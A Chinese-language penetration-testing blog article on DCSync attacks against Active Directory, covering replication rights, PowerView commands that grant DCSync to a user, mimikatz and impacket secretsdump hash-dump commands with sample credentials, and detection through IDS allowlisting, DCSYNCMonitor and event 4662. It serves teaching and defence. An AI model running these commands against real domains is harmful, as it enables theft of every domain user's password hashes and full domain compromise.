## DCSync 技术的攻击和检测

[Louisnie](https://tttang.com/user/Louisnie) 2022-06-28 10:02:00

[Windows安全](https://tttang.com/sort/windows/) [渗透测试](https://tttang.com/sort/pentest/)

------

# [一、DCSync原理：](https://tttang.com/archive/1634/#toc_dcsync)

在DCSync技术没有出现之前，攻击者要想拿到域内用户的hash，就只能在域控制器上运行 Mimikatz 或 Invoke-Mimikatz去抓取密码hash，但是在2015 年 8 月份， Mimkatz新增了一个主要功能叫"DCSync"，使用这项技术可以有效地 "模拟" 域控制器并从目标域控上请求域内用户密码hash。这项技术为当下域渗透提供了极大地便利，可以直接远程dump域内hash，另外也衍生出很多的攻击方式，所以我想专门做一项DCSync技术的专题。

刚刚我们说可以去模拟域控然后从目标域控上请求hash，那么这里就涉及到一个知识点叫AD的复制技术：

域控制器(DC)是Active Directory(AD)域的支柱，用于高效的管理域内用户，所以在企业当中，为了防止DC出现意外导致域内瘫痪，所以都是要布置多台域控作为AD域的备份，或者是部署多台域控制器，方便在站点位置本地提供身份验证和其他策略。当企业内网当做部署了多台域控制器后，一台域控进行了数据的更改之后，需要与其他域控进行数据的同步，**而这个同步是通过Microsoft的远程目录复制服务协议 (MS-DRSR),该协议是基于MSRPC / DCE/RPC )进行的。并且其 DRS 的 Microsoft API 是DRSUAPI(这个在后面抓包可以看到)**。。在不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，**通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求**。

我们都知道，在域内用户所具有的权限其实最根本是看用户的DACL，那么对于DCSync攻击来说，只要域用户拥有以下三条DACL即可向域控发出数据同步请求，从而dump去域内用户hash，这三条DACL分别为：

```
复制目录更改（DS-Replication-Get-Changes）

全部复制目录更改 (DS-Replication-Get-Changes-All )

在过滤集中复制目录更改(可有可无)（DS-Replication-Get-Changes-In-Filtered-Set）
```

默认本地管理员、域管理员或企业管理员以及域控制器计算机帐户的成员默认具有上述权限，注意，默认情况下，DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的。

# [二、查找域内具有DCSync权限的用户：](https://tttang.com/archive/1634/#toc_dcsync_1)

刚刚讲DCSync是向域用户写入两条ACL(授予域用户复制目录更改（DS-Replication-Get-Changes）和全部复制目录更改 (DS-Replication-Get-Changes-All))，我们可以使用powerview中的Add-DomainObjectAcl函数写入DCSync权限

## [1、写入DCSync：](https://tttang.com/archive/1634/#toc_1dcsync)

```
Set-ExecutionPolicy Bypass -Scope Process
import-module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity haha -Rights DCSync -Verbose
```

[![image.png](.\图片\1d1a429a-f388-4cb5-914e-82c14b8c8464.png)](https://storage.tttang.com/media/attachment/2022/06/25/1d1a429a-f388-4cb5-914e-82c14b8c8464.png)
当然我们更多时候是拿到一个cmd的shell，这么通过cmd调用powerview执行命令

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \"DC=test,DC=com\" -PrincipalIdentity haha -Rights DCSync -Verbose}"
```

## [2、删除DCSync：](https://tttang.com/archive/1634/#toc_2dcsync)

cmd下删除：

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \"DC=test,DC=com\" -PrincipalIdentity test -Rights DCSync -Verbose}"
```

ppowershell下删除：

```
Import-Module .\PowerView.ps1;
Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test -Rights DCSync -Verbose
```

## [3、查询具有DCSync权限的用户](https://tttang.com/archive/1634/#toc_3dcsync)

查询域内具有DCSync权限，其实就是查询域内用户的ACL，对比查询哪个用户拥有复制目录更改（DS-Replication-Get-Changes）和全部复制目录更改 (DS-Replication-Get-Changes-All）两条ACL

```
Import-Module  .\Powerview.ps1
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType  -match "DS-Replication-Get-Changes"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType  -match "Replicating Directory Changes"} 
```

[![image.png](.\图片\09638cf3-e4a7-4cd1-909b-90d549fa9ef3.png)](https://storage.tttang.com/media/attachment/2022/06/25/09638cf3-e4a7-4cd1-909b-90d549fa9ef3.png)
adfind查找

```
AdFind.exe -s subtree -b "DC=test,DC=com" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute

AdFind.exe -s subtree -b "DC=test,DC=com" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes All";; -recmute
```

[![image.png](.\图片\6f3b6e3b-4bd8-42f5-8e1a-c7b2ee77ea9a.png)](https://storage.tttang.com/media/attachment/2022/06/25/6f3b6e3b-4bd8-42f5-8e1a-c7b2ee77ea9a.png)

## [三、DCSync攻击域控](https://tttang.com/archive/1634/#toc_dcsync_2)

如果拿到了域内用户的权限，则可以在域内直接使用mimikatz去dump域控hash,注意：这里不需要使用debug权限也可以去直接dump哈希的，因为DCSync去向域控发起请求，并非本地操作，为网络请求。
当前为普通域用户，并非在管理员组中
[![image.png](.\图片\225775da-e1b1-417e-8a0d-99a3415e7010.png)](https://storage.tttang.com/media/attachment/2022/06/25/225775da-e1b1-417e-8a0d-99a3415e7010.png)
具有DCSync权限，则可以直接连接域控dump哈希

```
mimikatz.exe "log Micropoor.txt"  "lsadump::dcsync /domain:test.com /all /csv " "exit"
```

[![image.png](.\图片\43494f8d-4f67-4285-a0b7-8d9878828586.png)](https://storage.tttang.com/media/attachment/2022/06/25/43494f8d-4f67-4285-a0b7-8d9878828586.png)
如果主机上有杀软无法上传mimikatz，可以使用impacket中的secretsdump去dump哈希

```
python3 secretsdump.py test/admin:www123456#@192.168.189.128  -dc-ip  192.168.189.128
python3 secretsdump.py 'test.com/admin@dc.test.com' -hashes :6dfad00b946adf3479fba71beeb5e4ac
```

[![image.png](.\图片\a53fe121-44a1-4457-aa9b-be10ee20ab55.png)](https://storage.tttang.com/media/attachment/2022/06/25/a53fe121-44a1-4457-aa9b-be10ee20ab55.png)

## [1、DCSync攻击场景一：](https://tttang.com/archive/1634/#toc_1dcsync_1)

若拿到用户为以下组的用户，即可直接写入DCSync功能，从而dump哈希

```
Administrators组内的用户
domain admins组
enterprise admins组
域控制器的计算机帐户
```

当前admin用户为domain admins组的用户
[![image.png](.\图片\08ae7d22-257a-44cc-b5d9-eed727ee3eaf.png)](https://storage.tttang.com/media/attachment/2022/06/25/08ae7d22-257a-44cc-b5d9-eed727ee3eaf.png)
查看用户admin的ACL，我们都知道域用户在域内是否有权限，具体是看用户所具备的ACL

```
Import-Module .\Powerview.ps1
Get-DomainObjectAcl -Identity admin -domain test.com -ResolveGUIDs
```

查询到该用户可对自己有写入权限，那么即可写入DCSync
[![image.png](.\图片\1167cdda-a61a-4346-9ded-2c00e669091f.png)](https://storage.tttang.com/media/attachment/2022/06/25/1167cdda-a61a-4346-9ded-2c00e669091f.png)
powerview写入：

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \"DC=test,DC=com\" -PrincipalIdentity admin -Rights DCSync -Verbose}"
```

之后便可以使用mimikatz去寻找dc从而dump域内用户hash

```
mimikatz.exe "log Micropoor.txt"  "lsadump::dcsync /domain:test.com /all /csv" "exit"
```

[![image.png](.\图片\e8c93e26-ce0e-49be-ab10-ba85425fa43f.png)](https://storage.tttang.com/media/attachment/2022/06/25/e8c93e26-ce0e-49be-ab10-ba85425fa43f.png)

## [2、DCSync攻击场景二：](https://tttang.com/archive/1634/#toc_2dcsync_1)

若当前用户具有WriteDACL权限，那么我们可以通过该权限去写入DCSync功能
我们先在域控上给用户haha添加WriteDACL的权限

```
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity haha -Rights WriteDacl -Verbose
```

查看用户haha的DACL，发现其拥有WriteDACL的权限

```
 Get-ObjectAcl -SamAccountName "haha" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights-like "*dacl*"}
```

[![image.png](.\图片\ff896da6-2442-4915-baeb-6b5a9870b675.png)](https://storage.tttang.com/media/attachment/2022/06/25/ff896da6-2442-4915-baeb-6b5a9870b675.png)
那么便可以向自己写入DCSync权限

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \"DC=test,DC=com\" -PrincipalIdentity haha -Rights DCSync -Verbose}"
```

从而直接mimikatz去dump哈希

## [3、DCSync攻击场景三：](https://tttang.com/archive/1634/#toc_3dcsync_1)

windows域默认可以运行以下组内用户登陆到域控中：

```
Enterprise Admins (目录林管理员组)
Domain Admins(域管理员组)
Administrators
Backup Operators
Account Operators
Print Operators
```

这意味着如果一个攻击者能够拿下以上组中的一个账户，整个活动目录就可能被攻陷，因为这些用户组有登陆到域控的权限。
那么只要拿到该组中的其中一个用户的账号密码，即可登录到域控上，但是要注意必须是提权到system权限才可以dcsync，原因在于windows的域控机器账号默认可以进行DCSync
[![image.png](.\图片\38ec2e7f-dbec-4c24-8ace-5de85e83d6e9.png)](https://storage.tttang.com/media/attachment/2022/06/25/38ec2e7f-dbec-4c24-8ace-5de85e83d6e9.png)

# [四、检测 DCSync](https://tttang.com/archive/1634/#toc_dcsync_3)

## [1、通过网络流量端检测](https://tttang.com/archive/1634/#toc_1)

因为DCSync是网络请求，即攻击者假扮域控的角色使用GetNCChanges 向域控发起数据同步，那么我们可以对网络端的流量进行检测，将所有的域控IP设置为白名单，如果有非域控ip的数据同步请求，即可认为为DCSync攻击：

### [第一步：获取所有域控的ip地址并添加到"复制运行列表"](https://tttang.com/archive/1634/#toc_ip)

在域控上查询：

```
Get-ADDomainController -filter * | select IPv4Address
```

在域内普通主机powershell查询：

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select IPAddress
```

nslookup查询

```
nslookup -type=SRV  _ldap._tcp.dc._msdcs.test.com
```

[![image.png](.\图片\ee6a033a-8d82-4010-a909-19c5ec25cd95.png)](https://storage.tttang.com/media/attachment/2022/06/25/ee6a033a-8d82-4010-a909-19c5ec25cd95.png)

### [第二步、配置IDS监管网络流量](https://tttang.com/archive/1634/#toc_ids)

如若发现在以DsGetDCChange请求源不在"复制允许列表"，即请求源不是域控的主机那么便进行告警处理
[![image.png](.\图片\fdc1095e-131c-4a7f-97f8-699c3d6c2ff5.png)](https://storage.tttang.com/media/attachment/2022/06/25/fdc1095e-131c-4a7f-97f8-699c3d6c2ff5.png)

### [第三步：使用DCSYNCMonitor来监控网络流量](https://tttang.com/archive/1634/#toc_dcsyncmonitor)

我们还可以利用网络流量来检测 DCSync 攻击。需要在域控制器上安装一个工具DCSYNCMonitor来监控网络流量。当通过网络执行任何复制时，此工具会触发警报。当真正的域控制器请求复制时，这可能会触发误报警报。因此，建议使用DCSYNCMonitor工具和配置文件，我们在其中指定网络中域控制器的 IP 地址，以避免误报警报。
工具地址为：

```
https://github.com/shellster/DCSYNCMonitor
```

安装：
1、安装 Npcap，请从此处下载安装程序：https ://nmap.org/npcap/
2、下载程序：

```
https ://github.com/shellster/DCSYNCMonitor/raw/master/x64/Release/DCSYNCMONITORSERVICE.exe
```

3、安装必要的库dll:

```
    copy "%WINDIR%\System32\Npcap\*.dll" "%WINDIR%\System32\"
```

4、安装：DCSYNCMONITORSERVICE.exe -install
[![image.png](.\图片\6f0d5f50-217a-4809-8d75-a97f50fd46b9.png)](https://storage.tttang.com/media/attachment/2022/06/25/6f0d5f50-217a-4809-8d75-a97f50fd46b9.png)

5、启动该服务
[![image.png](.\图片\e64cb549-e574-4d03-9e84-0aedef21c28f.png)](https://storage.tttang.com/media/attachment/2022/06/25/e64cb549-e574-4d03-9e84-0aedef21c28f.png)

## [2、通过事后分析系统日志](https://tttang.com/archive/1634/#toc_2)

在windows日志4662可以清楚的看到test用户使用DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)和DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)这两条ACL权限向域控发起目录服务访问请求，从而dump域内hash。
[![image.png](.\图片\bc8c8735-764e-4033-b0ea-ca058b2e9a65.png)](https://storage.tttang.com/media/attachment/2022/06/25/bc8c8735-764e-4033-b0ea-ca058b2e9a65.png)